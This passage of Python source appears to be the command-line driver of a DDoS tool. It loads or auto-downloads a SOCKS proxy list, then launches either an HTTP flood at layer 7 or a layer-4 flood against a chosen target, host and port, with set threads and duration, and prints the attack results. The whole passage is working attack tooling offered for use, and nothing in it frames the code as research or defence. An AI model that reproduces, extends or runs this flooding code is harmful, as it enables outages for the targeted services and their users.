                print_warn(f"Proxy file '{proxyfile}' not found, falling back to auto-download")
                pm = ProxyManager(config)
                proxyfile = pm.handle_proxy_list(socks_type)
        target_info = Tools.parse_target(target)
        results = None
        if Methods.is_layer7(method):
            if not target.startswith('http://') and not target.startswith('https://'):
                scheme = "https" if target_info["port"] == 443 else "http"
                target_url = f"{scheme}://{target_info['host']}:{target_info['port']}{target_info['path']}"
            else:
                target_url = target
            flood = HttpFlood(
                target_url=target_url, threads=threads, proxy_file=proxyfile,
                rpc=rpc, duration=duration, method=method
            )
            results = flood.start()
        elif Methods.is_layer4(method):
            l4 = Layer4(
                target_ip=target_info["host"], target_port=target_info["port"],
                threads=threads, duration=duration, method=method, proxy_file=proxyfile
            )
            results = l4.start()
        else:
            print_error(f"Unknown method: {method}")
            print_info(f"Available Layer 7 methods: {', '.join(Methods.LAYER7_METHODS)}")
            print_info(f"Available Layer 4 methods: {', '.join(Methods.LAYER4_METHODS)}")
            return
        if results:
            print('\n' + Tools.format_results(results))


if __name__ == "__main__":
    try:
        ToolsConsole.run()
    except KeyboardInterrupt:
        print_warn("\nAttack interrupted by user")
    except Exception as e:
        print_error(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
